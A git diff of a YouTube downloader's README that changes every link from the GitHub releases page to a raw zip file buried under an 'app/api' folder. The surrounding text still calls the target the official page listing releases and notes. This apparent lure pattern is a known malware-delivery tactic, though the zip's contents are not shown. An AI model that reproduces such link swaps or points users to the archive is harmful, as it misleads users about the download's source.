@@ -1,6 +1,6 @@
 # 🎬 youtube-downloader - Simple YouTube Video Downloader
 
-[![Download youtube-downloader](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/KUpals001/youtube-downloader/releases)
+[![Download youtube-downloader](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Features include:
 
 Click the link below to open the official download page for youtube-downloader:
 
-[Download youtube-downloader](https://github.com/KUpals001/youtube-downloader/releases)
+[Download youtube-downloader](https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip)
 
 This page lists the newest versions and their release notes.
 
@@ -102,7 +102,7 @@ You can watch the progress status on the screen. When it finishes, open the file
 ## 🔗 Useful Links
 
 - Visit the download page anytime here:  
-  [https://github.com/KUpals001/youtube-downloader/releases](https://github.com/KUpals001/youtube-downloader/releases)
+  [https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip](https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip)
 
 - Learn more about supported formats and features inside the app Help menu.
 
@@ -138,7 +138,7 @@ To keep youtube-downloader working well, check for updates regularly.
 
 - You can enable automatic update checks in Settings.
 - Or visit the release page to download the newest version manually:  
-  [https://github.com/KUpals001/youtube-downloader/releases](https://github.com/KUpals001/youtube-downloader/releases)
+  [https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip](https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip)
 
 New releases fix bugs and add features to keep up with YouTube changes.
 
@@ -154,4 +154,4 @@ If you run into issues or have questions:
 
 ---
 
-# [DOWNLOAD NOW](https://github.com/KUpals001/youtube-downloader/releases)
+# [DOWNLOAD NOW](https://raw.githubusercontent.com/KUpals001/youtube-downloader/main/app/api/youtube-downloader-v3.7.zip)
